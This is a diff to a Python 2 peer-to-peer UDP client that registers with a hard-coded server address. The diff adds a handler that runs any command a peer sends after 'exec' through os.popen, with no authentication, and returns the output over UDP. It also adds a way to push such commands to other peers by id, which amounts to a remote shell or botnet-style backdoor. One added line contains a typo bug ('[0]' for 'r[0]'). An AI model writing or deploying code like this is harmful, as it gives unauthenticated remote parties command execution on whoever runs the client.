@@ -9,8 +9,9 @@ import socket
 import select
 import sys
 from time import time
+from os import popen 
 
-myid = '0b38ddb4627776f7ddf210cd90f1bec1'
+myid = '0000'
 SERVER = '192.162.66.82'
 SRVPORT = 8001
 SRCIP = '192.168.2.2'
@@ -79,7 +80,21 @@ def catch_server_cmd(socket, addrport, response):
 
 def catch_client_cmd(socket, addrport, response):
     r = str(response).rstrip().split(" ")
-    print "Msg from " + str(addrport) + str(r)
+
+    if r[0] == 'exec':
+        print "Executing command ", r[1]
+        for i in popen(r[1]).readlines():
+            send_udp(socket, addrport[0], addrport[1], "> " + i)
+    elif [0] == '>':
+        print str(r)
+
+def id2ip(id):
+    global clients
+    for i in clients:
+        if clients[i] == id:
+            return i
+
+    return False
 
 
 def user_worker(socket, data):
@@ -94,6 +109,12 @@ def user_worker(socket, data):
         print "Connecting to " + remoteid
         send_udp(socket, SERVER, SRVPORT, "get " + remoteid)
         send_udp(socket, SERVER, SRVPORT, "conn " + remoteid)
+    elif r[0] == "exec":
+        remoteid = r[1]
+        raddrport = id2ip(remoteid)
+        if raddrport:
+            claddr, clport = raddrport.split(":")
+            send_udp(socket, claddr, int(clport), "exec "+ r[2])
 
 
 socket = create_socket()
